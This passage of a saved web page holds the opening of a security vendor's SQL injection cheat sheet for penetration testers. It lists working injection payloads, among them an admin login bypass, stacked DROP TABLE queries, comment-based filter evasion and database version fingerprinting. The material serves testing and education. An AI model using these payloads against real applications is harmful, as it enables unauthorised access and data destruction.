@@ -1,0 +1,1552 @@
+<!DOCTYPE html>
+<html data-mutiny-loaded="true" lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="shortcut icon" href="https://dpsvdv74uwwos.cloudfront.net/statics/ns-favicon.ico">
+    <!-- Add to homescreen for Safari on iOS -->
+    <link rel="apple-touch-icon" sizes="144x144" href="https://dpsvdv74uwwos.cloudfront.net/statics/ico/netsparker-new-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://dpsvdv74uwwos.cloudfront.net/statics/ico/netsparker-new-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="52x52" href="https://dpsvdv74uwwos.cloudfront.net/statics/ico/netsparker-new-icon-52x52.png">
+    <!-- Add to homescreen for Chrome on Android -->
+    <link rel="icon" sizes="196x196" href="https://dpsvdv74uwwos.cloudfront.net/statics/ico/netsparker-new-icon-196x196.png">
+    <!-- Tile icon for Win8 (144x144 + tile color) -->
+    <meta name="msapplication-TileImage" content="https://dpsvdv74uwwos.cloudfront.net/statics/ico/netsparker-new-icon-144x144.png">
+    <meta name="msapplication-TileColor" content="#073652">
+	  
+	 <script src="sql%20injection%20cheat%20sheet_files/tracking.js" async=""></script><script src="sql%20injection%20cheat%20sheet_files/destinations.js" async=""></script><script async="" id="demandbase_js_lib" src="sql%20injection%20cheat%20sheet_files/5d2f088d2315fd57.js"></script><script type="text/javascript" async="" src="sql%20injection%20cheat%20sheet_files/tracking_002.js"></script><script async="" src="sql%20injection%20cheat%20sheet_files/clearbit.js"></script><script async="" src="sql%20injection%20cheat%20sheet_files/fbevents.js"></script><script type="text/javascript" async="" src="sql%20injection%20cheat%20sheet_files/conversion_async.js"></script><script type="text/javascript" async="" src="sql%20injection%20cheat%20sheet_files/bat.js"></script><script type="text/javascript" async="" src="sql%20injection%20cheat%20sheet_files/insight.js"></script><script async="" src="sql%20injection%20cheat%20sheet_files/gtm.js"></script><script async="" src="sql%20injection%20cheat%20sheet_files/analytics.js"></script><script>
+	(function(){var a=window.mutiny=window.mutiny||{};if(!window.mutiny.client){a.client={_queue:{}};var b=["identify","trackConversion"];var c=[].concat(b,["defaultOptOut","optOut","optIn"]);var d=function factory(c){return function(){for(var d=arguments.length,e=new Array(d),f=0;f<d;f++){e[f]=arguments[f]}a.client._queue[c]=a.client._queue[c]||[];if(b.includes(c)){return new Promise(function(b,d){a.client._queue[c].push({args:e,resolve:b,reject:d});setTimeout(d,500)})}else{a.client._queue[c].push({args:e})}}};c.forEach(function(b){a.client[b]=d(b)})}})();
+	</script>
+	<script src="sql%20injection%20cheat%20sheet_files/55f18a1f30252c8e.js"></script>
+
+        <title>SQL Injection Cheat Sheet | Netsparker</title>
+            <meta name="keywords" content="sql injection cheat sheet, sql injection, sql injection vulnerability, cheat sheet">
+            <meta name="description" content="The SQL Injection Cheat Sheet is the definitive resource for all the technical details about the different variants of the well-known SQLi vulnerability.">
+
+
+
+    <link rel="canonical" href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">
+    
+
+    <meta property="og:url" content="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">
+
+    <meta property="og:description" content="The SQL Injection Cheat Sheet is the definitive resource for all the technical details about the different variants of the well-known SQLi vulnerability.">
+
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="SQL Injection Cheat Sheet">
+        <meta property="og:image" content="https://dpsvdv74uwwos.cloudfront.net/statics/img/ogimage/sql-injection-cheat-sheet.jpg">
+
+  
+        <meta property="article:tag" content="sql-injection">
+        <meta property="article:tag" content="cheat-sheet">
+        <meta property="article:tag" content="web-security">
+
+    <script type="application/ld+json">
+        {
+        "@context": "http://schema.org",
+        "@type": "Blog",
+        "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/"
+        },
+        "headline": "SQL Injection Cheat Sheet",
+        "datePublished": "2015-10-21T10:00:00.0000000",
+        "dateModified": "2019-08-26T10:28:57.0770000",
+        "author": {
+        "@type": "Person",
+        "name": "Ferruh Mavituna"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Netsparker",
+        "logo": {
+        "@type": "ImageObject",
+        "url": "https://www.netsparker.com/statics/img/ns-logo/netsparker-new-logo.svg"
+        }
+        },
+        "description": "The SQL Injection Cheat Sheet is the definitive resource for all the technical details about the different variants of the well-known SQLi vulnerability."
+        }
+    </script>
+
+<link href="sql%20injection%20cheat%20sheet_files/css.css" rel="stylesheet">
+<link href="sql%20injection%20cheat%20sheet_files/custom_002.css" rel="stylesheet"><link href="sql%20injection%20cheat%20sheet_files/new-branding.css" rel="stylesheet">
+
+<script src="sql%20injection%20cheat%20sheet_files/j.php" type="text/javascript"></script><script src="sql%20injection%20cheat%20sheet_files/clipboard.js"></script><script async="" src="sql%20injection%20cheat%20sheet_files/hotjar-2144097.js"></script><script charset="utf-8" src="sql%20injection%20cheat%20sheet_files/8.js"></script><script src="sql%20injection%20cheat%20sheet_files/25035835.js" type="text/javascript" async="" data-ueto="ueto_2ecaa45e1c"></script></head>
+<body class="with-subnav-page no-navigation-bottom-border sticky">
+    <input name="UniqueUserId" value="ab9bb57de3ee44e0b72c11314941d3ac" type="hidden">
+    <div id="container">
+
+        <nav id="new-branding" class="navbar navbar-custom navbar-fixed-top navbar-v2 scrolling top-nav-collapse" role="navigation">
+            <div class="container g-container">
+  
+
+    
+
+                                      
+
+
+  
+
+  	<a href="https://www.netsparker.com/get-demo/" class="top-btn hidden-xs" id="getdemonavidc4af8e2b" rel="noreferrer">Get a demo</a>
+                                            
+                <div class="navbar-header">
+                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-main-collapse">
+                           <svg width="40" height="22" viewBox="0 0 40 22" fill="none" xmlns="http://www.w3.org/2000/svg">
+							  <rect width="40" height="2" fill="#1665FB"></rect>
+							  <rect y="10" width="40" height="2" fill="#1665FB"></rect>
+							  <rect y="20" width="40" height="2" fill="#1665FB"></rect>
+							</svg>
+
+                        </button>
+					                        <div class="top-btn-div">
+                              
+
+    
+
+                                      
+
+
+  
+
+    	<a href="https://www.netsparker.com/get-demo/" class="top-btn" id="getdemonavimc645e2ac0" rel="noreferrer">Get a demo</a>	  
+                          
+
+                        </div>
+                    <a class="navbar-brand navbar-brand-logo page-scroll" href="https://www.netsparker.com/" rel="noreferrer">
+                        <img class="mb0 navlogo" src="sql%20injection%20cheat%20sheet_files/netsparker_logo-by_invicti.svg" alt="Netsparker Logo - Web Application Security Scanner" width="260" height="52">
+						<img class="mb0 hidden navIcon" src="sql%20injection%20cheat%20sheet_files/netsparker-new-icon.svg" alt="Netsparker Logo - Web Application Security Scanner" width="265" height="40">
+                    </a>
+                </div>
+					<div class="collapse navbar-collapse navbar-right navbar-main-collapse">
+						<ul class="nav navbar-nav main-navbar-height" id="main">
+						  <li class="v-md">
+							<div class="dropdown upDown">
+							  <a class="page-active dropbtn" href="#" rel="noreferrer">Product <svg height="9" viewBox="0 0 15 9" width="15" xmlns="http://www.w3.org/2000/svg">
+							  <path d="M14.62 6.58L8.44.4S8.43.39 8.43.38C8.17.13 7.84 0 7.5 0s-.67.13-.93.38c0 0-.01.01-.01.02L.38 6.58a1.31 1.31 0 0 0 0 1.85 1.31 1.31 0 0 0 1.85 0L7.5 3.16l5.27 5.27a1.31 1.31 0 0 0 1.85 0 1.31 1.31 0 0 0 0-1.85z" fill="currentColor"></path></svg></a>
+							  <div class="dropdown-content new-product-dropdown">
+								<div class="dropdown-columns">
+								  <a href="https://www.netsparker.com/product/" rel="noreferrer">Overview</a> <a href="https://www.netsparker.com/features/" rel="noreferrer">Features</a>
+								</div>
+							  </div>
+							</div>
+						  </li>
+						  <li class="v-md">
+							<div class="dropdown upDown">
+							  <a class="page-active dropbtn" href="#" rel="noreferrer">Why Netsparker? <svg height="9" viewBox="0 0 15 9" width="15" xmlns="http://www.w3.org/2000/svg">
+							  <path d="M14.62 6.58L8.44.4S8.43.39 8.43.38C8.17.13 7.84 0 7.5 0s-.67.13-.93.38c0 0-.01.01-.01.02L.38 6.58a1.31 1.31 0 0 0 0 1.85 1.31 1.31 0 0 0 1.85 0L7.5 3.16l5.27 5.27a1.31 1.31 0 0 0 1.85 0 1.31 1.31 0 0 0 0-1.85z" fill="currentColor"></path></svg></a>
+							  <div class="dropdown-content new-product-dropdown">
+								<div class="dropdown-columns">
+								  <div class="dropdown upDown">
+									<a class="dropbtn" href="#" rel="noreferrer">Solutions <svg height="9" viewBox="0 0 15 9" width="15" xmlns="http://www.w3.org/2000/svg">
+									<path d="M14.62 6.58L8.44.4S8.43.39 8.43.38C8.17.13 7.84 0 7.5 0s-.67.13-.93.38c0 0-.01.01-.01.02L.38 6.58a1.31 1.31 0 0 0 0 1.85 1.31 1.31 0 0 0 1.85 0L7.5 3.16l5.27 5.27a1.31 1.31 0 0 0 1.85 0 1.31 1.31 0 0 0 0-1.85z" fill="currentColor"></path></svg></a>
+									<div class="dropdown-content two-column">
+									  <div class="dropdown-columns">
+										<div class="dropdown-columns-title">
+										  INDUSTRIES
+										</div><a href="https://www.netsparker.com/solutions/it-and-telecom/" rel="noreferrer">IT &amp; Telecom</a> <a href="https://www.netsparker.com/solutions/government/" rel="noreferrer">Government</a> <a href="https://www.netsparker.com/solutions/financial-services/" rel="noreferrer">Financial</a> <a href="https://www.netsparker.com/solutions/higher-education/" rel="noreferrer">Education</a> <a href="https://www.netsparker.com/solutions/healthcare/" rel="noreferrer">Healthcare</a>
+									  </div>
+									  <div class="dropdown-columns">
+										<div class="dropdown-columns-title">
+										  ROLES
+										</div><a href="https://www.netsparker.com/solutions/cto-ciso/" rel="noreferrer">CTO &amp; CISO</a> <a href="https://www.netsparker.com/solutions/engineering-manager/" rel="noreferrer">Engineering Manager</a> <a href="https://www.netsparker.com/solutions/security-engineer/" rel="noreferrer">Security Engineer</a> <a href="https://www.netsparker.com/solutions/devsecops/" rel="noreferrer">DevSecOps</a>
+									  </div>
+									</div>
+								  </div>
+								  <a href="https://www.netsparker.com/vulnerability-scanner-comparison/" rel="noreferrer">Comparison</a> 
+								  <a href="https://www.netsparker.com/case-studies/" rel="noreferrer">Case studies</a> 
+								  <a href="https://www.netsparker.com/web-vulnerability-scanner/customers/" rel="noreferrer">Customers</a> 
+								  <a href="https://www.netsparker.com/web-vulnerability-scanner/testimonials/" rel="noreferrer">Testimonials</a>
+								</div>
+							  </div>
+							</div>
+						  </li>
+						  <li class="v-md">
+							<a class="page-active" href="https://www.netsparker.com/pricing/" rel="noreferrer">Pricing</a>
+						  </li>
+						  <li class="v-md">
+							<div class="dropdown upDown">
+							  <a class="page-active dropbtn" href="#" rel="noreferrer">About Us <svg height="9" viewBox="0 0 15 9" width="15" xmlns="http://www.w3.org/2000/svg">
+							  <path d="M14.62 6.58L8.44.4S8.43.39 8.43.38C8.17.13 7.84 0 7.5 0s-.67.13-.93.38c0 0-.01.01-.01.02L.38 6.58a1.31 1.31 0 0 0 0 1.85 1.31 1.31 0 0 0 1.85 0L7.5 3.16l5.27 5.27a1.31 1.31 0 0 0 1.85 0 1.31 1.31 0 0 0 0-1.85z" fill="currentColor"></path></svg></a>
+							  <div class="dropdown-content new-product-dropdown">
+								<div class="dropdown-columns">
+								  <a href="https://www.netsparker.com/about/" rel="noreferrer">Our Story</a> 
+								  <a href="https://www.netsparker.com/blog/news/" rel="noreferrer">In the news</a> 
+								  <a href="https://www.netsparker.com/careers/" rel="noreferrer">Careers</a> 
+								  <a href="https://www.netsparker.com/contact/" rel="noreferrer">Contact us</a>
+								</div>
+							  </div>
+							</div>
+						  </li>
+						  <li class="v-md">
+							<div class="dropdown upDown">
+							  <a class="page-active dropbtn" href="#" rel="noreferrer">Resources <svg height="9" viewBox="0 0 15 9" width="15" xmlns="http://www.w3.org/2000/svg">
+							  <path d="M14.62 6.58L8.44.4S8.43.39 8.43.38C8.17.13 7.84 0 7.5 0s-.67.13-.93.38c0 0-.01.01-.01.02L.38 6.58a1.31 1.31 0 0 0 0 1.85 1.31 1.31 0 0 0 1.85 0L7.5 3.16l5.27 5.27a1.31 1.31 0 0 0 1.85 0 1.31 1.31 0 0 0 0-1.85z" fill="currentColor"></path></svg></a>
+							  <div class="dropdown-content new-product-dropdown">
+								<div class="dropdown-columns">
+								  <a href="https://www.netsparker.com/blog/" rel="noreferrer">Blog</a> 
+								  <a href="https://www.netsparker.com/white-papers/" rel="noreferrer">White Papers</a> 
+								  <a href="https://www.netsparker.com/resources/buyers-guide/" rel="noreferrer">Buyer's Guide</a> 
+								  <a href="https://www.netsparker.com/resources/" rel="noreferrer">Resource Library</a> 
+								  <a href="https://www.netsparker.com/partners/" rel="noreferrer">Partners</a> 
+								  <a href="https://www.netsparker.com/support/" rel="noreferrer">Support</a>
+								</div>
+							  </div>
+							</div>
+						  </li>
+						</ul>
+					</div>
+            </div>
+        </nav>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+<link href="sql%20injection%20cheat%20sheet_files/scroll.css" rel="stylesheet">
+
+
+
+<link href="sql%20injection%20cheat%20sheet_files/subnav.css" rel="stylesheet">
+<link href="sql%20injection%20cheat%20sheet_files/custom.css" rel="stylesheet">
+<link href="sql%20injection%20cheat%20sheet_files/blog-v2-read.css" rel="stylesheet">
+
+  
+  
+
+
+
+
+<div class="container-fluid sub-navbar-container sub-navbar-section nolrpad">
+    <div class="container g-container" id="subnavbarTop">
+        <div class="sub-navbar" id="subnavbar">
+            <div class="sub-navbar-left">
+                <ul class="sub-navbar-left-menu">
+                    <li id="subnavMainLink">
+                        <a href="https://www.netsparker.com/blog/" rel="noreferrer"> Web Security Blog</a>
+                    </li>
+                </ul>
+            </div>
+            <div class="sub-navbar-right">
+                <div class="sub-navbar-search-button">
+                    <a href="#" class="sub-navbar-search-toggle" data-selector=".sub-navbar-section" rel="noreferrer"></a>
+                </div>
+                <ul class="sub-navbar-right-menu">
+                  <li>
+                        <a href="https://www.netsparker.com/blog/web-security/" rel="noreferrer"> Web Security</a>
+                    </li>
+                    <li>
+                        <a href="https://www.netsparker.com/blog/news/" rel="noreferrer">
+                            News
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.netsparker.com/blog/releases/" rel="noreferrer">
+                            Product Releases
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.netsparker.com/blog/docs-and-faqs/" rel="noreferrer"> Product Docs &amp; FAQs</a>
+                    </li>
+                </ul>
+                <form class="sub-navbar-search-form" role="search" action="/search/">
+                    <input type="text" name="q" class="sub-navbar-search-input" placeholder="Type here to search..." id="sText">
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<main class="blog-v2-read">
+    <div class="container g-container section-padding-small">
+        
+			<div class="blog-v2-read-hero">
+				<div class="blog-v2-read-hero-left">
+					<h1>SQL Injection Cheat Sheet</h1>
+
+					<p>Use our SQL Injection Cheat Sheet to learn about the different 
+variants of the SQL Injection vulnerability. In this cheat sheet you can
+ find detailed technical information about SQL Injection vulnerabilities
+ against MySQL, Microsoft SQL Server, Oracle and PostgreSQL SQL servers.</p>
+					<div class="blog-v2-read-email-subscribe">
+						<form action="https://netsparker.us18.list-manage.com/subscribe/post?u=5b95175e9d922bf109568e064&amp;id=c41662cd70" method="post" id="mc-embedded-subscribe-form-sidebar" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate="">
+							<div class="input-group">
+								<input class="form-control" id="email-sidebar" name="EMAIL" placeholder="Enter your email to signup for the latest posts" type="email">
+								<span class="input-group-btn">
+									<button type="submit" id="subscribe1872706c-sidebar" class="btn btn-orange btn-orange-d btn-block">Subscribe</button>
+								</span>
+							</div>
+						</form>
+					</div>
+					<div class="text-privacy"><p class="mt10">Your Information will be kept <a href="https://www.netsparker.com/privacy-policy/" target="_blank" rel="noreferrer">private.</a></p></div>				  						
+				</div>
+				<div class="blog-v2-read-hero-right">
+					<img class="unpretty" src="sql%20injection%20cheat%20sheet_files/sql-injection-cheat-sheet.jpg" alt="SQL Injection Cheat Sheet" width="400" height="210">
+				</div>
+			</div>
+        
+        <div class="blog-v2-read-content blog-content">
+            <h2>What is an SQL Injection Cheat Sheet?</h2>
+<p>An SQL injection cheat sheet is a resource in which you can find 
+detailed technical information about the many different variants of the <a href="https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/sql-injection/" rel="noreferrer">SQL Injection vulnerability</a>. This cheat sheet is of good reference to both seasoned penetration tester and also those who are just getting started in <a href="https://www.netsparker.com/" rel="noreferrer">web application security</a>.</p>
+<p class="text-center"><a data-toggle="modal" data-target="#lightbox" class="zcursor" href="#"><img class="mb0" src="sql%20injection%20cheat%20sheet_files/sql-injection-cheat-sheet.jpg" alt="SQL Injection Cheat Sheet" width="600" height="315"></a></p>
+<h2><a id="about" name="about" rel="noreferrer"></a>About the SQL Injection Cheat Sheet</h2>
+<p class="text-left">This SQL injection cheat sheet was originally 
+published in 2007 by Ferruh Mavituna on his blog. We have updated it and
+ moved it over from our CEO's blog. Currently this SQL Cheat Sheet only 
+contains information for&nbsp;<strong>MySQL</strong>, <strong>Microsoft SQL Server</strong>, and some limited information for <strong>ORACLE</strong>&nbsp;and <strong>PostgreSQL </strong>SQL
+ servers. Some of the samples in this sheet might not work in every 
+situation because real live environments may vary depending on the usage
+ of parenthesis, different code bases and unexpected, strange and 
+complex SQL sentences.&nbsp;<br><br>Samples are provided to allow you to
+ get basic idea of a potential attack and almost every section includes a
+ brief information about itself.</p>
+<table>
+<tbody>
+<tr>
+<td><strong>M :</strong></td>
+<td>MySQL</td>
+</tr>
+<tr>
+<td><strong>S :</strong></td>
+<td>SQL Server</td>
+</tr>
+<tr>
+<td><strong>P :</strong></td>
+<td>PostgreSQL</td>
+</tr>
+<tr>
+<td><strong>O :</strong></td>
+<td>Oracle</td>
+</tr>
+<tr>
+<td><strong>+ :</strong></td>
+<td>Possibly all other databases</td>
+</tr>
+</tbody>
+</table>
+<p></p>
+<h5><em>Examples;</em></h5>
+<ul>
+<li><em>(MS) means : MySQL and SQL Server etc.</em></li>
+<li>(M*S) means : Only in some versions of MySQL or special conditions see related note and SQL Server</li>
+</ul>
+<h2><a id="TOC" name="TOC" rel="noreferrer"></a>Table Of Contents</h2>
+<ol>
+<li><a href="#SyntaxBasicAttacks" rel="noreferrer">Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks</a>
+<ol>
+<li><a href="#LineComments" rel="noreferrer">Line Comments</a>
+<ul>
+<li><a href="#LineCommentAttacks" rel="noreferrer">SQL Injection Attack Samples</a></li>
+</ul>
+</li>
+<li><a href="#InlineComments" rel="noreferrer">Inline Comments</a>
+<ul>
+<li><a href="#InlineSamples" rel="noreferrer">Classical Inline Comment SQL Injection Attack Samples</a></li>
+<li><a href="#MySQLInlineSamples" rel="noreferrer">MySQL Version Detection Sample Attacks</a></li>
+</ul>
+</li>
+<li><a href="#StackingQueries" rel="noreferrer">Stacking Queries</a>
+<ul>
+<li><a href="#LangDbFigure" rel="noreferrer">Language / Database Stacked Query Support Table</a></li>
+<li><a href="#AboutMySQLandPHP" rel="noreferrer">About MySQL and PHP</a></li>
+<li><a href="#StackedSamples" rel="noreferrer">Stacked SQL Injection Attack Samples</a></li>
+</ul>
+</li>
+<li><a href="#IfStatements" rel="noreferrer">If Statements</a>
+<ul>
+<li><a href="#MySQLIf" rel="noreferrer">MySQL If Statement</a></li>
+<li><a href="#SQLServerIf" rel="noreferrer">SQL Server If Statement</a></li>
+<li><a href="#SampleIfStatements" rel="noreferrer">If Statement SQL Injection Attack Samples</a></li>
+</ul>
+</li>
+<li><a href="#UsingIntegers" rel="noreferrer">Using Integers</a></li>
+<li><a href="#StringOperations" rel="noreferrer">String Operations</a>
+<ul>
+<li><a href="#StringConcat" rel="noreferrer">String Concatenation</a></li>
+</ul>
+</li>
+<li><a href="#StringwithoutQuotes" rel="noreferrer">Strings without Quotes</a>
+<ul>
+<li><a href="#HexbasedSamples" rel="noreferrer">Hex based SQL Injection Samples</a></li>
+</ul>
+</li>
+<li><a href="#StringModification" rel="noreferrer">String Modification &amp; Related</a></li>
+<li><a href="#UnionInjections" rel="noreferrer">Union Injections</a>
+<ul>
+<li><a href="#UnionLanguageIssues" rel="noreferrer">UNION – Fixing Language Issues</a></li>
+</ul>
+</li>
+<li><a href="#ByPassingLoginScreens" rel="noreferrer">Bypassing Login Screens</a></li>
+<li><a href="#Enablecmdshell" rel="noreferrer">Enabling xp_cmdshell in SQL Server 2005</a></li>
+<li><a href="#FindingDatabase" rel="noreferrer">Finding Database Structure in SQL Server</a></li>
+<li><a href="#FastWayToExtract" rel="noreferrer">Fast way to extract data from Error Based SQL Injections in SQL Server</a></li>
+<li><a href="#BlindSQLInjections" rel="noreferrer">Blind SQL Injections</a></li>
+<li><a href="#CoveringYourTracks" rel="noreferrer">Covering Your Tracks</a></li>
+<li><a href="#ExtraMySQLNotes" rel="noreferrer">Extra MySQL Notes</a></li>
+<li><a href="#SecondOrder" rel="noreferrer">Second Order SQL Injections</a></li>
+<li><a href="#OutOfBandChannelAttacks" rel="noreferrer">Out of Band (OOB) Channel Attacks</a></li>
+</ol>
+</li>
+</ol>
+<h2><a id="SyntaxBasicAttacks" name="SyntaxBasicAttacks" rel="noreferrer"></a>Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks</h2>
+<h3><a id="21" name="21" rel="noreferrer"></a>Ending / Commenting Out / Line Comments</h3>
+<h4><a id="LineComments" name="LineComments" rel="noreferrer"></a>Line Comments</h4>
+<p><strong>Comments out rest of the query.</strong>&nbsp;<br>Line comments are generally useful for ignoring rest of the query so you don't have to deal with fixing the syntax.</p>
+<ul>
+<li><code>--&nbsp;</code>(SM)<code>&nbsp;<br>DROP sampletable;--&nbsp;<br></code></li>
+<li><code>#&nbsp;</code>(M)<code>&nbsp;<br>DROP sampletable;#</code></li>
+</ul>
+<h5><a id="LineCommentAttacks" name="LineCommentAttacks" rel="noreferrer"></a>Line Comments Sample SQL Injection Attacks</h5>
+<ul>
+<li>Username:<code>&nbsp;admin'--</code></li>
+<li><code>SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'&nbsp;<br></code>This is going to log you as admin user, because rest of the SQL query will be ignored.</li>
+</ul>
+<h4><a id="InlineComments" name="InlineComments" rel="noreferrer"></a>Inline Comments</h4>
+<p><strong>Comments out rest of the query by not closing them</strong>&nbsp;or you can use for <strong>bypassing blacklisting</strong>, removing spaces, obfuscating and determining database versions.</p>
+<ul>
+<li><code>/*Comment Here*/</code>&nbsp;(SM)
+<ul>
+<li><code>DROP/*comment*/sampletable</code></li>
+<li><code>DR/**/OP/*bypass blacklisting*/sampletable</code></li>
+<li><code>SELECT/*avoid-spaces*/password/**/FROM/**/Members</code></li>
+</ul>
+</li>
+<li><code>/*! MYSQL Special SQL *</code>/ (M)&nbsp;<br>This is a special
+ comment syntax for MySQL. It's perfect for detecting MySQL version. If 
+you put a code into this comments it's going to execute in MySQL only. 
+Also you can use this to execute some code only if the server is higher 
+than supplied version.&nbsp;<br><br><code>SELECT&nbsp;/*!<strong>32302</strong>&nbsp;1/0, */&nbsp;1 FROM tablename</code></li>
+</ul>
+<h5><a id="InlineSamples" name="InlineSamples" rel="noreferrer"></a>Classical Inline Comment SQL Injection Attack Samples</h5>
+<ul>
+<li>ID:&nbsp;<code>10; DROP TABLE members&nbsp;/*</code>&nbsp;<br>Simply get rid of other stuff at the end the of query. Same as&nbsp;<code>10; DROP TABLE members&nbsp;--</code></li>
+<li><code>SELECT&nbsp;/*!<strong>32302</strong>&nbsp;1/0, */&nbsp;1 FROM tablename</code>&nbsp;<br>Will throw an&nbsp;<strong>divison by 0 error&nbsp;</strong>if MySQL version is higher than<strong>3.23.02</strong></li>
+</ul>
+<h5><a id="MySQLInlineSamples" name="MySQLInlineSamples" rel="noreferrer"></a>MySQL Version Detection Sample Attacks</h5>
+<ul>
+<li>ID:&nbsp;<code>/*!</code><code><strong>32302</strong>&nbsp;10*/</code></li>
+<li>ID:&nbsp;<code>10</code>&nbsp;<br>You will get the&nbsp;<strong>same response</strong>&nbsp;if MySQL version is higher than&nbsp;<strong>3.23.02</strong></li>
+<li><code>SELECT&nbsp;/*!<strong>32302</strong>&nbsp;1/0, */&nbsp;1 FROM tablename</code>&nbsp;<br>Will throw a&nbsp;<strong>division by 0 error&nbsp;</strong>if MySQL version is higher than<strong>3.23.02</strong></li>
+</ul>
+<h3><a id="StackingQueries" name="StackingQueries" rel="noreferrer"></a>Stacking Queries</h3>
+<p><strong>Executing more than one query in one transaction</strong>. This is very useful in every injection point, especially in SQL Server back ended applications.</p>
+<ul>
+<li><code>;</code>&nbsp;(S)&nbsp;<br><code>SELECT * FROM members; DROP members--</code></li>
+</ul>
+<p>Ends a query and starts a new one.</p>
+<h4><a id="LangDbFigure" name="LangDbFigure" rel="noreferrer"></a>Language / Database Stacked Query Support Table</h4>
+<p><strong>green:</strong>&nbsp;supported,&nbsp;<strong>dark gray:</strong>&nbsp;not supported,&nbsp;<strong>light gray:&nbsp;</strong>unknown</p>
+<p style="text-align: center;"><img src="sql%20injection%20cheat%20sheet_files/SQL-Cheat-Sheet.jpg" alt="SQL Injection Cheat sheet " width="500"></p>
+<p><strong><a id="AboutMySQLandPHP" name="AboutMySQLandPHP" rel="noreferrer"></a>About MySQL and PHP;</strong>&nbsp;<br>To clarify some issues;&nbsp;<br><strong>PHP - MySQL doesn't support stacked queries</strong>, Java doesn't support stacked queries (<em>I'm sure for ORACLE, not quite sure about other databases</em>).&nbsp;<em>Normally
+ MySQL supports stacked queries but because of database layer in most of
+ the configurations it's not possible to execute a second query in 
+PHP-MySQL applications or maybe MySQL client supports this, not quite 
+sure. Can someone clarify?</em></p>
+<h5><a id="StackedSamples" name="StackedSamples" rel="noreferrer"></a>Stacked SQL Injection Attack Samples</h5>
+<ul>
+<li>ID:&nbsp;<code>10;DROP members --</code></li>
+<li><code>SELECT * FROM products WHERE id = 10; DROP members--</code></li>
+</ul>
+<p>This will run&nbsp;<em>DROP members</em>&nbsp;SQL sentence after normal SQL Query.</p>
+<h3><a id="IfStatements" name="IfStatements" rel="noreferrer"></a>If Statements</h3>
+<p>Get response based on an if statement. This is <strong>one of the key points of Blind SQL Injection</strong>, also can be very useful to test simple stuff blindly and <strong>accurately</strong>.</p>
+<h4><a id="MySQLIf" name="MySQLIf" rel="noreferrer"></a>MySQL If Statement</h4>
+<ul>
+<li><code>IF(<strong><em>condition</em>,<em>true-part</em>,<em>false-part</em></strong>)&nbsp;</code>(M)<code>&nbsp;<br>SELECT IF(1=1,'true','false')</code></li>
+</ul>
+<h4><a id="SQLServerIf" name="SQLServerIf" rel="noreferrer"></a>SQL Server If Statement</h4>
+<ul>
+<li><code>IF&nbsp;<strong><em>condition</em></strong>&nbsp;<strong><em>true-part</em></strong>&nbsp;ELSE&nbsp;<strong><em>false-part</em></strong></code>&nbsp;(S)&nbsp;<br><code>IF (1=1) SELECT 'true' ELSE SELECT 'false'</code></li>
+</ul>
+<h4>Oracle&nbsp;If Statement</h4>
+<ul>
+<li><code>BEGIN<br>IF&nbsp;<strong><em>condition</em></strong>&nbsp;THEN&nbsp;<strong><em>true-part</em></strong>; ELSE&nbsp;<strong><em>false-part</em></strong>; END IF; END;</code>&nbsp;(O)&nbsp;<br><code>IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;</code></li>
+</ul>
+<h4>PostgreSQL If Statement</h4>
+<ul>
+<li><code>SELECT CASE WHEN&nbsp;<strong><em>condition</em></strong>&nbsp;THEN&nbsp;<strong><em>true-part</em></strong>&nbsp;ELSE&nbsp;<strong><em>false-part</em></strong></code>&nbsp;END; (P)&nbsp;<br><code>SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;</code></li>
+</ul>
+<h5><a id="SampleIfStatements" name="SampleIfStatements" rel="noreferrer"></a>If Statement SQL Injection Attack Samples</h5>
+<p><code>if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0</code>&nbsp;(S)&nbsp;<br>This will throw an&nbsp;<strong>divide by zero error</strong>&nbsp;if current logged user is not&nbsp;<strong>"sa" or "dbo"</strong>.</p>
+<h3><a id="UsingIntegers" name="UsingIntegers" rel="noreferrer"></a>Using Integers</h3>
+<p>Very useful for bypassing,&nbsp;<strong>magic_quotes() and similar filters</strong>, or even WAFs.</p>
+<ul>
+<li><code>0x<em>HEXNUMBER</em></code>&nbsp;(SM)&nbsp;<br>You can&nbsp; write hex like these;&nbsp;<br><br><code>SELECT CHAR(0x66)</code>&nbsp;(S)&nbsp;<br><code>SELECT 0x5045</code>&nbsp;(<em>this is not an integer it will be a string from Hex</em>)&nbsp;(M)&nbsp;<br><code>SELECT 0x50 + 0x45</code>&nbsp;(<em>this is integer now!</em>)&nbsp;(M)</li>
+</ul>
+<h3><a id="StringOperations" name="StringOperations" rel="noreferrer"></a>String&nbsp; Operations</h3>
+<p>String related operations. These can be quite useful to build up 
+injections which are not using any quotes, bypass any other black 
+listing or determine back end database.</p>
+<h4><a id="StringConcat" name="StringConcat" rel="noreferrer"></a>String Concatenation</h4>
+<ul>
+<li><code>+</code>&nbsp;(S)&nbsp;<br><code>SELECT login&nbsp;+ '-' +&nbsp;password FROM members</code></li>
+<li><code>||</code>&nbsp;(*MO)&nbsp;<br><code>SELECT login&nbsp;|| '-' ||&nbsp;password FROM members</code></li>
+</ul>
+<p><strong>*About MySQL "||";</strong>&nbsp;<br>If MySQL is running in 
+ANSI mode it's going to work but otherwise MySQL accept it as `logical 
